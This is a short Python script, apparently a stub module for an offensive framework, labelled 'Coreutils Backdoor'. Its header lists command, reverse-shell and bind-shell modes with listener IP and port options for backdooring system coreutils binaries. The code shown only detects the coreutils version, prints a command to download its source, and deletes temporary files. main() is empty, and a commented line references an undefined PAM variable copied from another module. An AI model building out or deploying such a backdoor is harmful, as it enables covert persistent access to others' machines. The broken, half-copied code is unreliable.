#!/usr/bin/python3
#[ONLINE][Backdoor] Coreutils Backdoor
#MODE,yes,Mode to use (cmd, rev, bind)
#CMD,no,Command to execute while calling choosen coreutils binaries
#LISTENER_IP,no,IP address to send reverse shell to
#LISTENER_PORT,no,TCP port of listener
#BIND_PORT,no,TCP port to set bind shell on
#END

import subprocess
import os

def check_coreutils_version():
    coreutils_version = subprocess.check_output("dpkg -l | grep -i coreutils", shell=True).decode('utf-8').split()[2]
    return coreutils_version.split('-')[0]

def get_coreutils_sources(coreutils_version):
    coreutils_download_directory = "/tmp/coreutils_source_" + coreutils_version
    #os.system("wget -c https://github.com/coreutils/coreutils/archive/refs/tags/v" + coreutils_version + ".tar.gz -O " + pam_download_directory + " && mkdir /tmp/coreutils_source && tar -xf " + coreutils_download_directory + " -C /tmp/coreutils_source --strip-components 1")
    print("wget -c https://github.com/coreutils/coreutils/archive/refs/tags/v" + coreutils_version + ".tar.gz -O " + coreutils_download_directory + " && mkdir /tmp/coreutils_source && tar -xf " + coreutils_download_directory + " -C /tmp/coreutils_source --strip-components 1")
    #return pam_download_directory

def clean_sources():
    os.system('rm -rf /tmp/coreutils_sources*')

def main(arguments):
    pass

get_coreutils_sources(check_coreutils_version())
